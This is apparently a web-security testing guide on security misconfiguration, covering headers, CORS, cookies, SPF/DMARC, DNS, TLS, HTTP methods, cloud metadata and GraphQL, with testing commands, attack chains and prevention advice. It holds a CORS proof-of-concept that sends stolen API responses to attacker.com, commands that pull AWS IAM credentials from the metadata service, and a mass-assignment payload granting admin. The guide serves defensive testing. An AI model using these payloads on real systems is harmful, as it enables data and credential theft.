---
title: Security Misconfiguration
---

# Security Misconfiguration

Security Misconfiguration is a web and infrastructure vulnerability that arises when systems, applications, or services are deployed with insecure defaults, unnecessary features enabled, or incorrect security settings. This creates easy entry points for attackers to steal data, escalate privileges, or disrupt operations.

## Types of Security Misconfigurations-

### 1. HTTP Security Headers Misconfiguration

Missing or weak security headers expose applications to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks. Headers tell the browser how to handle requests and responses.

- **HSTS (Strict-Transport-Security):** Forces HTTPS; missing header allows MITM and downgrade
- **X-Frame-Options:** Prevents clickjacking; absent allows iframe embedding
- **Content-Security-Policy (CSP):** Restricts script/style sources; weak or missing enables XSS
- **X-Content-Type-Options:** Stops MIME sniffing; missing lets the browser second-guess the declared type and render a response as HTML/JS (e.g. a `text/plain` or user-uploaded file) → content-type confusion and XSS
- **Referrer-Policy:** Controls referrer leakage; misconfigured can expose sensitive URLs
- **Permissions-Policy:** Limits browser features; broad settings expand attack surface

### 2. CORS (Cross-Origin Resource Sharing) Misconfiguration

CORS controls which domains can access resources cross-origin. Misconfigurations let attackers read sensitive data or perform actions on behalf of users.

- **Origin reflection:** Server echoes any `Origin` in `Access-Control-Allow-Origin`
- **Credentials + reflected origin:** `Access-Control-Allow-Credentials: true` with a reflected/attacker-controllable origin (or `null`). Note: browsers reject `Access-Control-Allow-Origin: *` together with credentials — a literal wildcard is *not* exploitable here, so the risk is origin reflection
- **Subdomain trust:** `.example.com` allows any subdomain; exploitable via subdomain takeover

### 3. Cookie Security Misconfiguration

Session and auth cookies without proper flags can be stolen via XSS or transmitted over HTTP.

- **Missing HttpOnly:** JavaScript can read cookies → XSS-based theft
- **Missing Secure:** Cookies sent over HTTP → interception
- **SameSite=None (or too permissive):** Cookies sent on cross-site requests → CSRF. Note: a *missing* attribute now defaults to `Lax` in modern browsers (still sent on top-level cross-site GET navigations; older/edge clients may send it on all requests), so `SameSite=None` is the setting to flag
- **Broad Domain scope:** `domain=.example.com` exposes cookies to subdomains

### 4. Email Server Misconfiguration (SPF, DKIM, DMARC)

Weak or missing email authentication allows spoofing, phishing, and business email compromise.

- **Missing SPF:** Any server can send mail as your domain
- **Weak SPF (`+all`, `?all`):** `+all` (Pass) explicitly authorizes any sender → direct spoofing; `?all` (Neutral) makes no assertion and provides no protection. Both leave the domain spoofable
- **Missing/invalid DKIM:** No cryptographic proof of sender
- **Missing DMARC or p=none:** No enforcement; spoofed mail can reach inbox
- **Misaligned DMARC:** SPF/DKIM domains don’t align with From domain

### 5. DNS Misconfiguration

- **Missing CAA records:** Any CA can issue certs for the domain
- **Zone transfer (AXFR) allowed:** Entire DNS zone downloadable → subdomains, IPs, internal hosts exposed
- **Open resolvers:** Can be abused for amplification attacks

### 6. TLS/SSL Misconfiguration

Weak ciphers, outdated protocols, or invalid certificates enable MITM, downgrade, and decryption.

- **SSLv2/SSLv3 or TLS 1.0/1.1:** Deprecated and vulnerable
- **Weak ciphers (RC4, DES, 3DES, export ciphers):** Easily broken
- **Certificate issues:** Expired, self-signed, wrong hostname, weak key
- **No OCSP stapling:** Slower revocation checks

### 7. Web Server & Application Configuration

- **Directory listing enabled:** Exposes files and paths
- **Default/sample pages:** Leak server type, version, path
- **HTTP PUT/DELETE enabled:** Unauthorized file upload/delete
- **Verbose error messages:** Stack traces, paths, versions
- **Default credentials:** Admin or service accounts unchanged
- **Backup files exposed:** `.bak`, `.old`, `.swp`, `config.json` in web root

### 8. OutDated Components

Libraries, frameworks, and plugins with known CVEs (e.g., jQuery, Angular, log4j) are easy targets for automated exploitation. Track versions via response headers, HTML comments, JS file names, and dependency manifests.

**Tools:** retire.js, Wappalyzer , Nuclei (CVE templates)

### 9. Cloud Storage Misconfiguration

- **Public S3/Azure/GCP buckets:** Unintended public read/write
- **Overly permissive IAM:** Excessive access to storage or APIs

### 10. API & Access Control Misconfiguration

- **Unauthenticated endpoints:** Sensitive data without auth
- **Exposed admin/management interfaces:** Reachable from internet
- **Overly permissive CORS or CORS + credentials** on APIs

## Attack Surfaces

- **Web Layer:** HTTP headers, cookies, CORS, CSP, session management
- **Server Layer:** Nginx, Apache, IIS, Tomcat defaults, directory listing, HTTP methods
- **Application:** Debug mode, error messages, backup files, default credentials
- **Email:** SPF, DKIM, DMARC, MX records
- **DNS:** CAA, zone transfer, open resolvers
- **TLS:** Protocol versions, ciphers, certificates
- **Cloud:** S3, Azure Blob, GCP Storage, IAM policies
- **APIs:** Unprotected endpoints, excessive CORS trust

## Exploitation and Bypassing Defenses

### 1. HTTP Security Headers

**What to test:** Presence and correctness of HSTS, X-Frame-Options, CSP, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.

**Manual:**

```bash
curl -I https://target.com
curl -s -D - https://target.com -o /dev/null
```

**Tools:**

```bash
# Nuclei
nuclei -u https://target.com -tags misconfig,headers
nuclei -u https://target.com -t http/misconfiguration/
```

**Common findings:** Missing HSTS, weak CSP (e.g. `unsafe-inline`), missing X-Frame-Options.

### 2. CORS Misconfiguration

**What to test:** Origin reflection, credential handling, subdomain trust.

**Manual (Burp Repeater):**

1. Send request to sensitive API with `Origin: https://evil.com`
2. If response has `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true` → vulnerable

**POC (reflect origin + credentials):**

```html
<script>
  fetch('https://target.com/api/sensitive', {credentials: 'include'})
    .then(r=>r.text()).then(d=>document.location='https://attacker.com/?data='+btoa(d));
</script>
```

**Origin bypass tests:**

- `Origin: null` (some servers allow null)
- `Origin: target.com.evil.com` (subdomain confusion)
- `Origin: target.com` (typosquat / sibling subdomain)
- `Origin: https://target.com` with trailing space/newline
- Double encoding or special chars in Origin

**Tools:** Burp Suite, OWASP ZAP, custom scripts.

### 3. Cookie Attributes

**What to test:** HttpOnly, Secure, SameSite on session and auth cookies.

**Manual:** Inspect `Set-Cookie` in browser DevTools or proxy. Look for:

- No `HttpOnly` on session cookies
- No `Secure` when site uses HTTPS
- `SameSite=None` without `Secure`, or broad `Domain`

**Tool:**

```bash
curl -I -s https://target.com | grep -i set-cookie
```

### 4. Email (SPF, DKIM, DMARC)

**What to test:** SPF syntax, DKIM keys, DMARC policy and alignment.

**Manual:**

```bash
dig TXT target.com
dig TXT _dmarc.target.com
dig TXT selector._domainkey.target.com
```

**Tools:**

- MXToolbox, dmarcian, mxtoolbox.com/spf
- EmailSecCheck: `python3 emailseccheck.py -d target.com`

### 5. DNS Misconfiguration

**Zone transfer:**

```bash
dig axfr @ns.target.com target.com
host -l target.com ns.target.com
dnsrecon -d target.com -t axfr
```

**CAA:**

```bash
dig CAA target.com
nslookup -type=CAA target.com
```

**Tools:** dig, nslookup, dnsrecon, fierce.

### 6. TLS/SSL Misconfiguration

**Manual (OpenSSL):**

```bash
openssl s_client -connect target.com:443
openssl s_client -connect target.com:443 -tls1
openssl s_client -connect target.com:443 -tls1_1
```

**Tools:**

```bash
# testssl.sh
./testssl.sh https://target.com

# sslscan
sslscan target.com

# Nmap
nmap --script ssl-enum-ciphers -p 443 target.com
```

### 7. HTTP Methods (PUT, DELETE)

**What to test:** Unnecessary or incorrectly-authorized method support on production paths (PUT/DELETE/PATCH), and whether debug/unsafe methods like `TRACE` are disabled.

**Manual:**

```bash
# Discover supported methods (if allowed)
curl -X OPTIONS https://target.com/

# PUT (upload/overwrite risk)
curl -X PUT https://target.com/test.txt -H "Content-Type: text/plain" -d "content"

# DELETE (resource destruction risk)
curl -X DELETE https://target.com/test.txt

# PATCH (partial update / Broken Object Level Authorization risk)
curl -X PATCH https://target.com/api/resource/123 \
-H "Content-Type: application/json" \
-d '{"field":"test"}'

# TRACE (must be disabled; can leak headers and enable XST/request reflection)
curl -i -X TRACE https://target.com/ -H "X-Test: 123"
```

**Expected :**

- For unauthorized objects/actions: expect `401/403` (not `2xx`)
- For disallowed methods: expect `405 Method Not Allowed` (or `400`), not success
- For `TRACE`: you should not get an echoed full request back in the response body (TRACE can enable Cross-Site Tracing / information disclosure chains: see OWASP Cross-Site Tracing and PortSwigger TRACE method enabled)

**Tools:**

```bash
# Burp Suite, Nuclei (http/misconfiguration/)
# OWASP/WSTG-style method discovery/testing (includes PUT/DELETE/PATCH/TRACE testing objectives: OWASP WSTG Test HTTP Methods)
```

### 8. Server Banner & Version Disclosure

**Manual:**

```bash
curl -I https://target.com
nc target.com 80
nmap -sV -p 80,443 target.com
whatweb https://target.com
```

**Look for:** Server, X-Powered-By, X-AspNet-Version, X-Generator, X-Drupal-Cache.

### 9. Default Pages & Directory Listing

**What to test:** Default Nginx/IIS/Apache pages, `index.html`, directory listing.

**Manual:**

```bash
Browse /, /index.html, common paths like /admin, /backup, /config.
```

**Tools:**

```bash
Dirbuster, gobuster, ffuf, Nuclei.
```

### 10. Backup & Config Files

**What to test:** `.bak`, `.old`, `.swp`, `config.json`, `.env`, `web.config.bak`.

```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt
gobuster dir -u https://target.com -w /path/to/wordlist
```

### **11. Cloud-Metadata Hunting**

**What to test:**

SSRF-style paths and misrouting that allow the server to reach instance metadata endpoints (commonly AWS IMDS) and then obtain IAM credentials/metadata. Then check whether those credentials can be used for any **read/write** action in cloud (depends on IAM role permissions).

**Manual:**

```bash
1) Identify SSRF entry points (typical): URL fetch, image import, webhook URL, debug download, proxy fetch
#  Try sending a target that resolves to link-local metadata IPs.

2) AWS IMDSv1 / IMDSv2 reachability checks
# IMDSv1
curl -s http://169.254.169.254/latest/meta-data/instance-id
# IMDSv2 (requires token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
-H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Expected :**

- If metadata endpoints respond, you can usually enumerate IAM role names and attempt credential access.
- If credentials are available and the role has write permissions, you may be able to **upload/write to storage**, **start instances**, **modify security groups**, or **access additional secrets**.

**Tools:**

```bash
Burp Suite (proxy + Repeater to inject SSRF URLs)
curl / httpie (metadata probing)
Tools for SSRF/metadata context: InternalAllTheThings AWS metadata
```

### **12. API & Access Control Misconfiguration (GraphQL Introspection, Mass Assignment, Overly-Permissive Keys)**

**What to test:**

- GraphQL introspection enabled in production (schema discovery)
- Missing/weak field-level authorization on mutations (mass assignment / broken authz)
- Unprotected or over-scoped API keys / tokens (too much privilege, poor audience/role enforcement)
- Authorization drift between queries vs mutations and between “UI allowed fields” vs actual server input

**Manual:**

```bash
1) Confirm introspection
# (Try in the GraphQL endpoint; commonly POST /graphql)
# Minimal introspection probe:
curl -s -X POST https://target.com/graphql \
-H "Content-Type: application/json" \
--data '{"query":"{ __schema { queryType { name } } }"}'

2) Enumerate mutations/fields from schema (then target authz gaps)
# Use the discovered mutation arguments/inputs and try injecting extra fields.
# Example pattern (mass assignment attempt):
curl -s -X POST https://target.com/graphql \
-H "Content-Type: application/json" \
-H "Authorization: Bearer <token>" \
--data '{
"query":"mutation UpdateUser($input: UpdateUserInput!) { updateUser(input: $input) { id role } }",
"variables":{
"input":{
"id":"<victimOrOwnId>",
"role":"admin",
"isSuperUser":true}}
}'
```

**Expected :**

- Introspection should be disabled or restricted; if enabled, it accelerates exploitation.
- If mutation accepts unauthorized fields or object IDs, you can often escalate privileges (BOLA/mass assignment style).

**Tools:**

```bash
Burp Suite (GraphQL requests in Repeater)
GraphQL testing guidance:
- OWASP WSTG GraphQL testing
- PortSwigger GraphQL
```

### 13. Rate Limiting & Caching Misconfiguration

**What to test:**

- Missing/weak rate limits (by endpoint, by user, by IP, by token)
- Inconsistent throttling (e.g., auth endpoints throttle, but password reset / enumeration endpoints don’t)
- Rate limit bypass via caching/pagination variations (cache key not including user/session)
- Cache-control mistakes that allow sensitive responses to be cached and served to other users
- Missing/incorrect `Cache-Control`, `Pragma`, `Vary`, `no-store` directives on auth-sensitive endpoints

**Manual:**

```bash
1) Rate limiting checks (authentication + enumeration endpoints)
# Try varying identifiers (user id/email/resource id) and observe throttling behavior.
for i in 1 2 3 4 5; do
curl -s -X POST https://target.com/api/login \
-H "Content-Type: application/json" \
--data "{\"email\":\"user${i}@test.com\",\"password\":\"wrong\"}" \
-D - | head -n 20
done

2) Cache header validation (sensitive endpoints)
curl -s -I https://target.com/api/me
# Look for: Cache-Control: no-store (or similarly strict policy) + correct Vary usage
```

**Expected :**

- Auth bypass chains: brute-force/enumeration that should be throttled keeps succeeding.
- Cache misconfig: sensitive responses appear in cache and are replayed across sessions/users (or served after auth changes).
- OWASP guidance expects proper cache headers for sensitive content. See: Cache poisoning

**Tools:**

```bash
Burp Suite (Repeater + custom headers; concurrency tests)
Reference for rate limiting expectations: OWASP API Security - Lack of Resources & Rate Limiting
Reference for cache poisoning/misconfig behavior: OWASP Cache Poisoning
```

### **14. Running With Elevated Privileges & Session Misconfiguration (Session Fixation / Cookie Theft / Blast Radius)**

**What to test:**

**A) Elevated privilege / blast radius**

- App/container running as root or with excessive privileges
- `privileged` containers, unsafe mounts, broad filesystem/network permissions (amplifies post-exploitation)

**B) Session misconfiguration**

- Missing/incorrect cookie flags (`HttpOnly`, `Secure`, `SameSite`)
- Session not rotated on login (session fixation risk)
- Weak session lifetime/reuse behaviors after logout/role change

**Manual:**

```bash
A) Session cookie safety (inspect Set-Cookie via proxy or curl)
curl -s -I https://target.com/ | findstr /i "set-cookie"

B) Session fixation check (high level workflow)
1. Start unauthenticated visit -> capture session cookie value
2. Authenticate -> verify session cookie value changes (rotation)
#  If it stays the same, it may be vulnerable to fixation.
```

**Expected :**

- Root/elevated privilege: once any web exploit works, impact grows (more paths to host/cloud compromise).
- Session fixation: attacker can force a known session ID to a victim; if server doesn’t rotate on auth, attacker can reuse the session.
- Cookie misconfig: without `HttpOnly`/`Secure`/correct `SameSite`, theft/CSRF risk increases.

**Tools:**

```bash
Burp Suite (cookie inspection, login sequencing, session rotation comparison)
Cookie/security references:
- MDN - Cookie security flags
- OWASP WSTG - Session Fixation testing
Elevated privilege hardening reference (containers):
Docker security best practices (stop running as root)
```

## Advanced Attack Scenarios

### 1. CORS + XSS → Account Takeover

**Flow:** API reflects an arbitrary `Origin` with `Access-Control-Allow-Credentials: true` → attacker’s script (hosted on `evil.com`, or injected via XSS on a *trusted subdomain* like `sub.target.com`) runs on an origin the policy allows → it fetches `/api/session` with `credentials: 'include'` → browser exposes the response because the origin is reflected/trusted → session token exfiltrated → account takeover.

**Note:** Pure reflected-origin CORS needs no XSS at all (the victim just visits `evil.com`). XSS only adds to the chain when the injected script sits on an origin the CORS policy trusts — a same-origin XSS already reads its own API without needing CORS.

**Takeaway:** Combine CORS with subdomain takeover, XSS on a trusted subdomain, or open redirect to escalate impact.

### 2. Missing HSTS + MITM → Credential Theft

**Flow:** No HSTS → user types `example.com` or follows HTTP link → traffic over HTTP → attacker intercepts → steals cookies/credentials.

**Takeaway:** Missing HSTS enables protocol downgrade and cookie theft on shared networks.

### 3. Missing X-Frame-Options + Phishing → Clickjacking

**Flow:** Sensitive action (e.g. “Confirm transfer”) in frameable page → attacker loads it in transparent iframe → victim clicks “Play game” → actually clicks “Confirm” → unauthorized action.

**Takeaway:** Missing X-Frame-Options makes clickjacking trivial for state-changing actions.

### 4. Weak CSP + Stored XSS → Data Exfiltration

**Flow:** CSP allows `unsafe-inline` or `unsafe-eval` → stored XSS executes → attacker steals tokens, keys, or PII.

**Takeaway:** CSP weaknesses remove a key defense against XSS.

### 5. Zone Transfer → Subdomain Enumeration → Takeover

**Flow:** AXFR succeeds → full zone list → find CNAMEs to third-party services → check for takeover → claim subdomain → abuse for phishing/OAuth/CORS.

**Takeaway:** DNS misconfiguration feeds subdomain takeover and further recon.

### 6. Exposed Config + Cloud Credentials → Full Compromise

**Flow:** `config.json` or `.env` exposed → AWS/GCP/Azure keys found → attacker uses keys for cloud access → data exfiltration, resource abuse, lateral movement.

**Takeaway:** Config exposure often leads to cloud and infra compromise.

### 7. Default Credentials + Exposed Admin → Full Control

**Flow:** Admin panel reachable from internet → default admin:admin works → attacker changes settings, adds users, deploys malware.

**Takeaway:** Default creds plus exposed admin are a direct path to compromise.

### 8. Email Spoofing (No DMARC) + Phishing

**Flow:** No DMARC or p=none → spoofed emails reach inbox → victim trusts “From: ceo@company.com” → enters credentials or wiring info.

**Takeaway:** Missing DMARC enables convincing phishing and BEC.

## Service-Specific Considerations

### Nginx

- **Directory listing:** `autoindex on` → disable
- **Server token:** `server_tokens off` to hide version
- **Default pages:** Replace `index.html`, remove Nginx references from error pages
- **TLS:** Configure strong ciphers, disable SSLv3/TLS1.0

### Apache

- **Directory listing:** `Options -Indexes`
- **ServerTokens:** Set to `Prod` or `Minor`
- **Sample/status:** Remove `server-status`, `server-info`, `manual`
- **TraceEnable:** Set to `Off`

### Microsoft IIS

- **Directory browsing:** Disable in IIS Manager
- **X-Powered-By:** Remove via `web.config` or server config
- **Default page:** Replace `iisstart.htm`, check for shortname enumeration (tilde)
- **PUT/DELETE:** Restrict or disable for production paths

### Cloud (AWS S3, Azure Blob, GCP)

- **Bucket policy:** Avoid `s3:GetObject` with `Principal: "*"`
- **ACL:** Avoid public-read; use least-privilege IAM
- **Tools:** aws s3api get-bucket-acl, ScoutSuite, Prowler

## Test Cases Quick Reference

| Misconfiguration | Test Action | Expected |
| --- | --- | --- |
| HSTS | `curl -I` over HTTPS | `Strict-Transport-Security` present |
| X-Frame-Options | Inspect response headers | `X-Frame-Options: DENY` or `SAMEORIGIN` |
| CORS | Send `Origin: evil.com`, check response | No reflection of arbitrary Origin |
| Cookie HttpOnly | Inspect `Set-Cookie` | Session cookies have HttpOnly |
| Cookie Secure | Inspect `Set-Cookie` over HTTPS | Cookies have Secure |
| SPF/DKIM/DMARC | `dig TXT` on domain and `_dmarc` | Valid SPF, DKIM, DMARC policy |
| Zone Transfer | `dig axfr @ns target.com` | AXFR denied |
| CAA | `dig CAA target.com` | CAA records restrict CAs |
| TLS | testssl.sh / openssl s_client | Strong ciphers, TLS 1.2+ only |
| HTTP PUT | `curl -X PUT` | 405 or 403 |
| Directory Listing | Request `/` or dirs | No listing of directory contents |
| Version Disclosure | Check Server, X-Powered-By | No versions or generic values |

## Detection Techniques

### Manual

- **Headers:** curl, Burp, browser DevTools
- **CORS:** Burp Repeater with custom Origin
- **Cookies:** DevTools → Application → Cookies, or proxy
- **DNS:** dig, nslookup, dnsrecon
- **TLS:** openssl s_client, testssl.sh
- **Methods:** curl -X OPTIONS/PUT/DELETE
- **Files:** manual paths, ffuf/gobuster

### Automated

- **Headers:** Mozilla Observatory, SecurityHeaders.com, Nuclei (headers/misconfig)
- **General:** Nuclei, OWASP ZAP, Burp Scanner, Nikto
- **TLS:** testssl.sh, sslscan, Nmap scripts
- **DNS:** dnsrecon, fierce
- **Email:** MXToolbox, EmailSecCheck, DMARC analyzers

## Impact

- **Data breach:** Exposed configs, open storage, verbose errors
- **Account takeover:** CORS + XSS, cookie theft, session fixation
- **Phishing :** Email spoofing via weak SPF/DKIM/DMARC
- **Clickjacking:** Missing X-Frame-Options
- **MITM / downgrade:** Weak TLS or missing HSTS
- **Recon :** Zone transfer, version disclosure, default pages
- **Compliance:** GDPR, HIPAA, PCI-DSS violations and fines

## Prevention Techniques

- Apply secure defaults; avoid shipping with known weak settings
- Change default credentials; use strong, unique passwords
- Remove sample apps, default pages, and debug endpoints from production
- Enable and configure security headers (HSTS, CSP, X-Frame-Options, etc.)
- Restrict CORS to specific, trusted origins; avoid reflection
- Set HttpOnly, Secure, and SameSite on cookies
- Configure SPF, DKIM, and DMARC with reject policy where possible
- Disable zone transfer or limit to authorized secondaries
- Add CAA records to restrict certificate issuance
- Use strong TLS only; disable legacy protocols and weak ciphers
- Disable unnecessary HTTP methods (PUT, DELETE, etc.)
- Turn off directory listing; use safe error pages
- Keep components patched; track and update dependencies
- Use automation (CI/CD checks, scanners) for config validation

## Tools

| Category | Tool | Purpose |
| --- | --- | --- |
| Headers | Mozilla Observatory | HTTP header security scan |
| Headers | SecurityHeaders.com | Header grading and recommendations |
| Headers | curl | Manual header inspection |
| CORS | Burp Suite | Origin manipulation, CORS testing |
| Cookies | Browser DevTools | Inspect Set-Cookie attributes |
| DNS | dig, nslookup | Zone transfer, CAA, SPF/DMARC |
| DNS | dnsrecon | Recon, AXFR, subdomains |
| TLS | testssl.sh | TLS/cipher/protocol checks |
| TLS | sslscan | Cipher and protocol enumeration |
| TLS | OpenSSL | Manual TLS checks |
| Scanners | Nuclei | Misconfig and header templates |
| Scanners | OWASP ZAP | Passive/active config checks |
| Scanners | Nikto | Web server and config issues |
| Components | retire.js | Outdated JS libraries with known CVEs |
| Components | OWASP Dependency-Check | Dependency vulnerability scan |
| Email | MXToolbox | SPF, DKIM, DMARC checks |
| Email | EmailSecCheck | SPF/DMARC misconfig detection |
| Fuzzing | ffuf, gobuster | File/dir discovery, backup/config hunting |
| Version | whatweb, Wappalyzer | Tech and version detection |

## Good to Read

- [A Practical Exploitation of a CORS Misconfiguration (Raj Qureshi, Medium)](https://medium.com/@rajqureshi07/a-practical-exploitation-of-a-cors-misconfiguration-4169134ac907) — API reflected Origin with credentials; Burp testing and fetch-based PoC for data exfiltration.
- [From CORS Misconfiguration to Account Takeover (Maaj, Medium)](https://medium.com/@maajix/from-cors-misconfiguration-to-account-takeover-1231f263a90e) — How CORS issues chain with other flaws for full ATO and credential theft.
- [1-Click Account Takeover via CORS (Muhammed Mubarak, Medium)](https://medium.com/@mohammed01550038865/1-click-account-takeover-ato-via-cors-misconfiguration-64dc26d24917) — Single-click ATO using reflected Origin and credentials; includes PoC.
- [Chaining CORS by Reflected XSS to Steal Sensitive Data (Infosec Writeups)](https://infosecwriteups.com/chaining-cors-by-reflected-xss-to-steal-sensitive-data-c456e133c10d) — CORS + XSS chain for stealing data from authenticated users.
- [Critical Misconfiguration: Unprotected config.json (Muhammad Habib, Medium)](https://medium.com/@m.habibgpi/critical-misconfiguration-unprotected-config-json-1a867d5d89e2) — Unprotected config on staging exposed Sentry DSN and Zendesk API keys.
- [Security Misconfiguration Leading to AWS Access (Abin, Medium)](https://medium.com/@abinsecurityresearcher/security-misconfiguration-leading-to-sensitive-information-disclosure-and-potential-aws-access-dd8521b0c771) — Exposed AWS keys in source led to potential cloud access.
- [pWning resources.gcash.com via HTTP PUT (Evan Ricafort)](https://blog.evanricafort.com/2025/01/http-put-method-enabled-gcash.html) — HTTP PUT allowed arbitrary file upload and overwrite without auth.
- [IIS Default Page to Information Disclosure (0xdln1)](https://0xdln1.github.io/IIS-Default-Page-to-Information-Disclosure/) — How default IIS pages leak paths and enable further discovery.
- [Capital One Breach 2019](https://www.capitalone.com/digital/facts2019/) — WAF (SSRF) misconfiguration reached the instance metadata service; the IAM role’s over-permissive S3 access exposed 106M records.
- [Microsoft Power Apps 2021](https://zenity.io/blog/research/the-microsoft-power-apps-portal-data-leak-revisited-are-you-safe-now) — Default settings allowed anonymous OData access; 38M+ records exposed.
- [OWASP WSTG – Configuration and Deployment Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README) — 14 test cases: network, platform, files, backups, admin, HTTP methods, HSTS, CORS/cross-domain, subdomain takeover, cloud, CSP, path confusion.
- [OWASP A02:2025 – Security Misconfiguration](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/) — Top 10 entry (up from A05 in 2021): causes, examples, prevention.

## References

[https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/)

[https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/)

[https://observatory.mozilla.org/](https://observatory.mozilla.org/)

[https://securityheaders.com/](https://securityheaders.com/)

[https://portswigger.net/kb/issues/00100900_http-put-method-is-enabled](https://portswigger.net/kb/issues/00100900_http-put-method-is-enabled)

[https://book.hacktricks.xyz/pentesting-web/cors-bypass](https://book.hacktricks.xyz/pentesting-web/cors-bypass)

[https://github.com/drwetter/testssl.sh](https://github.com/drwetter/testssl.sh)

[https://github.com/MarkoH17/EmailSecCheck](https://github.com/MarkoH17/EmailSecCheck)

[https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration)

[https://www.sentinelone.com/blog/security-misconfiguration/](https://www.sentinelone.com/blog/security-misconfiguration/)